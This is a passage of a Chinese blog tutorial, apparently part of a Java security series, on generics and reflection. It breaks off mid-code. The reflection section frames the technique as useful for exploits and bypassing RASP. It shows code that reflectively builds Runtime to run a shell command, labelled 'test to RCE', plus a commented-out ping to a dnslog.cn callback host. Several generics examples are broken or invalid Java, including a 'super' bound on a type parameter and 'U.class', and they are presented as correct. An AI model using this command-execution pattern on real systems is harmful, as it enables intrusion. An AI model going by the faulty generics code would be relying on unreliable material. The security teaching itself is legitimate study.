class_">IProcessor</span>&lt;T, U&gt; &#123;</span><br><span class="line">   U <span class="title function_">process</span><span class="params">(T input)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 情况一：子类非泛型类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringProcessor</span> <span class="keyword">implements</span> <span class="title class_">Processor</span>&lt;String&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">process</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> input.toUpperCase();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 情况二：子类是泛型类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringProcessor</span>&lt;T <span class="keyword">extends</span> <span class="title class_">String</span>&gt; <span class="keyword">implements</span> <span class="title class_">Processor</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">process</span><span class="params">(T input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> input.toUpperCase();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 情况三：部分泛型</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringToIntProcessor</span>&lt;U&gt; <span class="keyword">implements</span> <span class="title class_">IProcessor</span>&lt;String, U&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> U <span class="title function_">process</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (U.class == Integer.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> (U) Integer.valueOf(input);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unsupported type&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h4 id="泛型函数"><a href="#泛型函数" class="headerlink" title="泛型函数"></a>泛型函数</h4><ol><li>泛型方法需要用<code>&lt;T&gt;</code>前缀来表示这是一个泛型方法</li><li>根据调用时传入的参数确定泛型参数</li><li>实例：<strong>实现一个根据类名获取实例的泛型方法</strong></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">getObject</span><span class="params">(Class&lt;T&gt; c)</span> <span class="keyword">throws</span> InstantationException&#123;</span><br><span class="line">   <span class="type">T</span> <span class="variable">t</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">   <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> getObject(Class.forName(<span class="string">&quot;ReflectionTest.User&quot;</span>));</span><br></pre></td></tr></table></figure><h3 id="泛型的上下边界机制"><a href="#泛型的上下边界机制" class="headerlink" title="泛型的上下边界机制"></a>泛型的上下边界机制</h3><h4 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h4><ol><li>局限1：应用了泛型后，如果进行类型的转换或者不同函数调用时，发现所接受的类型其实是当前泛型参数的父类时，此时直接使用会出错，不太方便</li><li>局限2：同时，如果对于参数的类型有某些要求的话，这里也无法实现会出错</li><li>出于以上两个原因，java引入了泛型的上下界机制对泛型进行拓展</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 局限1的情况</span></span><br><span class="line"><span class="comment">// B extends A</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">funC</span><span class="params">(List&lt;A&gt; listA)</span> &#123;</span><br><span class="line">    <span class="comment">// ...          </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">funD</span><span class="params">(List&lt;B&gt; listB)</span> &#123;</span><br><span class="line">    funC(listB); <span class="comment">// Unresolved compilation problem: The method doPrint(List&lt;A&gt;) in the type test is not applicable for the arguments (List&lt;B&gt;)</span></span><br><span class="line">    <span class="comment">// ...             </span></span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line"><span class="comment">// 局限2的情况常常出现在排序函数需要参数可以比较 --&gt; 要求参数类实现Comparable接口</span></span><br></pre></td></tr></table></figure><h4 id="上界"><a href="#上界" class="headerlink" title="上界"></a>上界</h4><ol><li><code>&lt;T extends BoundType&gt;</code>: 指定类型参数必须是某个特定类型或其子类型<ol><li><em><strong>可以使用&amp;连接多个上界</strong></em>: <code>&lt;T extends BoundType1 &amp; BoundType2 &amp; ...&gt;</code></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;T&gt;&gt; T <span class="title function_">findMax</span><span class="params">(List&lt;T&gt; list)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (list == <span class="literal">null</span> || list.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;List must not be null or empty&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">T</span> <span class="variable">maxElement</span> <span class="operator">=</span> list.get(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (T element : list) &#123;</span><br><span class="line">        <span class="keyword">if</span> (element.compareTo(maxElement) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            maxElement = element;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxElement;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="下界"><a href="#下界" class="headerlink" title="下界"></a>下界</h4><ol><li><code>&lt;T super BoundType&gt;</code>: 指定类型参数必须是某个特定类型或其父类型</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只要是Number机器父类都可以成为泛型</span></span><br><span class="line"><span class="keyword">public</span> &lt;T <span class="built_in">super</span> Number&gt; <span class="keyword">void</span> <span class="title function_">addNumbers</span><span class="params">(List&lt;T&gt; list, Number... numbers)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (Number number : numbers) &#123;</span><br><span class="line">        list.add((T) number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="综合应用与最佳实践"><a href="#综合应用与最佳实践" class="headerlink" title="综合应用与最佳实践"></a>综合应用与最佳实践</h4><ol><li><p>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>  &lt;E <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;? <span class="built_in">super</span> E&gt;&gt; E <span class="title function_">max</span><span class="params">(List&lt;? extends E&gt; e1)</span> &#123;</span><br><span class="line">   <span class="comment">// E必须实现比较器</span></span><br><span class="line">   <span class="comment">// 比较器必须支持E及它的父类</span></span><br><span class="line">    <span class="keyword">if</span> (e1 == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//迭代器返回的元素属于 E 的某个子类型</span></span><br><span class="line">    Iterator&lt;? <span class="keyword">extends</span> <span class="title class_">E</span>&gt; iterator = e1.iterator();</span><br><span class="line">    <span class="type">E</span> <span class="variable">result</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">        <span class="type">E</span> <span class="variable">next</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">        <span class="keyword">if</span> (next.compareTo(result) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            result = next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用原则《Effictive Java》</p><ol><li>为了获得最大限度的灵活性，要在表示 生产者或者消费者 的输入参数上使用通配符，使用的规则就是：生产者有上限、消费者有下限</li><li>如果参数化类型表示一个 T 的生产者，使用 &lt; ? extends T&gt;;</li><li>如果它表示一个 T 的消费者，就使用 &lt; ? super T&gt;；</li><li>如果既是生产又是消费，那使用通配符就没什么意义了，因为你需要的是精确的参数类型。</li></ol></li></ol><h3 id="Q-A"><a href="#Q-A" class="headerlink" title="*Q&amp;A &lt;T&gt;"></a>*Q&amp;A &lt;T&gt;</h3><h4 id="1-Class和Class"><a href="#1-Class和Class" class="headerlink" title="1. Class和Class&lt;?&gt;"></a>1. Class和Class&lt;?&gt;</h4><h4 id="2-ArrayList和List"><a href="#2-ArrayList和List" class="headerlink" title="2. ArrayList&lt;Integer&gt;和List&lt;Number&gt;"></a>2. ArrayList&lt;Integer&gt;和List&lt;Number&gt;</h4><ol><li><p>补充一点泛型接口和泛型类的关系</p></li><li><p>不能把ArrayList&lt;Integer&gt;向上转型为ArrayList&lt;Number&gt;或List&lt;Number&gt; –&gt; <em><strong><code>ArrayList&lt;Integer&gt;</code>和<code>ArrayList&lt;Number&gt;</code>两者完全没有继承关系</strong></em>，但是就是T不变时，可以向上转型，T本身不能向上转型</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果可以，产生矛盾</span></span><br><span class="line"><span class="comment">// 编译器为了避免这种错误，根本不允许把ArrayList&lt;Integer&gt;转型为ArrayList&lt;Number&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建ArrayList&lt;Integer&gt;类型：</span></span><br><span class="line">ArrayList&lt;Integer&gt; integerList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line"><span class="comment">// 添加一个Integer：</span></span><br><span class="line">integerList.add(<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">123</span>));</span><br><span class="line"><span class="comment">// “向上转型”为ArrayList&lt;Number&gt;：</span></span><br><span class="line">ArrayList&lt;Number&gt; numberList = integerList;</span><br><span class="line"><span class="comment">// 添加一个Float，因为Float也是Number：</span></span><br><span class="line">numberList.add(<span class="keyword">new</span> <span class="title class_">Float</span>(<span class="number">12.34</span>));</span><br><span class="line"><span class="comment">// 从ArrayList&lt;Integer&gt;获取索引为1的元素（即添加的Float）：</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">n</span> <span class="operator">=</span> integerList.get(<span class="number">1</span>); <span class="comment">// ClassCastException!</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><h3 id="反射引入"><a href="#反射引入" class="headerlink" title="反射引入"></a>反射引入</h3><blockquote><p>Java反射机制是Java动态性中最为重要的体现，利用反射机制我们可以轻松的实现Java类的动态调用。Java的大部分框架都是采用了反射机制来实现的(如:Spring MVC、ORM框架等)，Java反射在编写漏洞利用代码、代码审计、绕过RASP方法限制等中起到了至关重要的作用</p></blockquote><ol><li>主要作用<ol><li>获取<strong>类的信息</strong>：<ol><li>获取类的名称、父类、实现的接口等。</li><li>获取类的字段、方法和构造函数。</li></ol></li><li>创建对象：<ol><li>通过类名创建对象。</li><li>调用带有不同参数的构造函数。</li></ol></li><li>访问字段与方法<ol><li>读取和设置字段的值，包括私有字段。</li><li>调用对象的方法，包括私有方法。</li></ol></li><li>创建和操作数组：<ol><li>创建数组对象，获取数组的长度，读取和设置数组元素。</li></ol></li></ol></li></ol><h3 id="深入反射的原理"><a href="#深入反射的原理" class="headerlink" title="深入反射的原理"></a>深入反射的原理</h3><ol><li>还是先上图<img src="/pic/Java%E5%AE%89%E5%85%A81_%E7%B1%BB%E4%B8%8E%E5%8F%8D%E5%B0%84/%E5%8F%8D%E5%B0%84%E6%9C%BA%E7%90%86.png" alt="flow"></li><li>我们的反射机制本身不复杂，就是获取一个类的Class对象，然后在用Class对象中的获取成员变量Field，成员方法Method和构造方法Constructor等方法，再去动态获取一个类或者调用一个类的属性，变量，构造方法等方式</li></ol><h3 id="利用反射进行操作"><a href="#利用反射进行操作" class="headerlink" title="*利用反射进行操作"></a>*利用反射进行操作</h3><h4 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h4><ol><li><p>一般有3中方式</p><ol><li><em><strong>补充内部类</strong></em>: 反射调用内部类的时候需要使用<code>$</code>来代替.,如com.anbai.Test类有一个叫做Hello的内部类，那么调用的时候就应该将类名写成：<code>com.anbai.Test$Hello</code></li><li><em><strong>类加载器方式不进行初始化</strong></em>: 通过类加载器获取 Class 对象不会进行初始化，意味着不进行包括初始化等一系列步骤，<strong>静态代码块和静态对象不会得到执行</strong></li><li>异常处理是<code>ClassNotFoundException</code></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 1. 知道具体类：字面量路径</span></span><br><span class="line"> &#123;ClassName&#125;.class</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 2. 已知类名：字符串类型路径(必须完整)</span></span><br><span class="line"> Class.forName(<span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 3. 类加载器获取: 字符串类型路径(必须完整)</span></span><br><span class="line"> &#123;classLoader&#125;.loadClass(<span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 4. 通过实例获取</span></span><br><span class="line"><span class="type">TargetObject</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TargetObject</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">alunbarClass2</span> <span class="operator">=</span> o.getClass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 举个例子</span></span><br><span class="line"> <span class="keyword">package</span> Reflection;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;Reflection.User&quot;</span>;</span><br><span class="line">         <span class="type">Class</span> <span class="variable">what</span> <span class="operator">=</span> User.class;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="comment">// 需要处理异常</span></span><br><span class="line">             <span class="type">Class</span> <span class="variable">what1</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">             <span class="comment">// 需要处理异常</span></span><br><span class="line">             <span class="type">Class</span> <span class="variable">what2</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().loadClass(className);</span><br><span class="line">         &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">             System.err.println(<span class="string">&quot;Class not found: &quot;</span> + className);</span><br><span class="line">             e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">         <span class="type">Class</span> <span class="variable">what3</span> <span class="operator">=</span> user.getClass();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="类构造函数"><a href="#类构造函数" class="headerlink" title="类构造函数"></a>类构造函数</h4><ol><li>类型：Constructor</li><li>想获取类的所有构造方法可以使用：clazz.getDeclaredConstructors来获取一个Constructor数组。</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">runtimeClass1.getDeclaredConstructor()</span><br><span class="line">runtimeClass1.getConstructor()  <span class="comment">// 无法获取到私有方法 --&gt; 一般使用这个</span></span><br><span class="line">    <span class="comment">// 注意一下权限constructor.setAccessible(true)</span></span><br></pre></td></tr></table></figure><h4 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h4><ol><li>类型: Method</li><li>关于参数<ol><li>method.invoke的第一个参数必须是类实例对象，如果调用的是static方法那么第一个参数值可以传null，因为在java中调用静态方法是不需要有类实例的，因为可以直接类名.方法名(参数)的方式调用。</li><li>method.invoke第二个参数如果有参数那么就<strong>必须严格的依次传入对应的参数类型</strong></li><li><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Method.html#invoke-java.lang.Object-java.lang.Object...-">java8文档</a></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 1. 获取类方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> xxx.getMethod(<span class="string">&quot;methodname&quot;</span>,<span class="string">&quot;参数类型&quot;</span>); <span class="comment">// getMethod只能获取到当前类和父类的所有有权限的方法(如：public)</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> xxx.getDeclaredMethod(<span class="string">&quot;方法名&quot;</span>, <span class="string">&quot;参数类型如String.class，多个参数用,号隔开&quot;</span>);   <span class="comment">// getDeclaredMethod能获取到当前类的所有成员方法(不包含父类)</span></span><br><span class="line">    <span class="comment">// +s形式返回一个数组</span></span><br><span class="line"><span class="comment">// 2. 调用类方法，静态第一个参数可以是null</span></span><br><span class="line">method.invoke(方法实例对象, 方法参数值，多个参数值用,隔开);</span><br><span class="line"><span class="comment">// invoke函数原型</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj,</span></span><br><span class="line"><span class="params">                     Object... args)</span></span><br><span class="line">              <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">                     IllegalArgumentException,</span><br><span class="line">                     InvocationTargetException</span><br></pre></td></tr></table></figure><h4 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h4><ol><li>Field</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 先获取字段</span></span><br><span class="line">  <span class="comment">// getField和getDeclaredField的区别同getMethod和getDeclaredMethod</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">fields</span> <span class="operator">=</span> xxx.getDeclaredFields();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span>  <span class="operator">=</span> xxx.getDeclaredField(<span class="string">&quot;变量名&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 获取字段后获取值</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> field.get(类实例对象);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 修改变量</span></span><br><span class="line">field.set(类实例对象, 修改后的值);</span><br><span class="line">    <span class="comment">// 注意权限</span></span><br><span class="line">    field.setAccessible(<span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. final关键字修饰的成员变量 --&gt; 需要先修改</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> field.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);    <span class="comment">// 修改成员变量的Field对象的modifiers值，~Modifier.FINAL</span></span><br><span class="line">field.set(类实例对象, 修改后的值);</span><br></pre></td></tr></table></figure><h3 id="小试牛刀-反射调用Runtime"><a href="#小试牛刀-反射调用Runtime" class="headerlink" title="小试牛刀: 反射调用Runtime"></a>小试牛刀: 反射调用Runtime</h3><ol><li>先来一个普通写法<code>System.out.println(org.apache.commons.io.IOUtils.toString(Runtime.getRuntime.exec(&#39;ls&#39;).getInputStream(),&#39;utf-8&#39;))</code></li><li>使用反射写法<ol><li><strong>不一样的创建实例</strong>: 使用Runtime类的Class对象获取Runtime类的无参数构造方法(getDeclaredConstructor())，因为Runtime的构造方法是private的我们无法直接调用，所以我们需要通过反射去修改方法的访问权限<code>constructor.setAccessible(true)</code></li></ol></li></ol><blockquote><p>练习1: Apache Commons IO 输出运行结果<br>忽略了头文件</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;ls&quot;</span>;</span><br><span class="line"><span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改权限</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> runtimeClass.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取方法并调用方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">runtimeMethod</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取命令执行结果并输出，这个写法比较简洁 --&gt; Apache Commons IO：提供更简洁的 API，代码更简洁，但需要引入额外的依赖</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">System.out.println(org.apache.commons.io.IOUtils.toString(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br></pre></td></tr></table></figure><blockquote><p>练习2: java标准api输出结果</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Reflection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">// test to RCE</span></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">// 1. 创建对象</span></span><br><span class="line">          Class&lt;?&gt; myclass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">          Constructor&lt;?&gt; constructor = myclass.getDeclaredConstructor();</span><br><span class="line">          constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">          <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 2. 获取方法</span></span><br><span class="line">          <span class="comment">// String cmd = &quot;ping 8f1x4d.dnslog.cn&quot;;</span></span><br><span class="line">          <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">          <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> myclass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">          <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) execMethod.invoke(obj,cmd);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 3. 获取方法输出</span></span><br><span class="line">          <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">          <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">          <span class="type">StringBuilder</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">          String line;</span><br><span class="line">          <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">              content.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">          &#125;</span><br><span 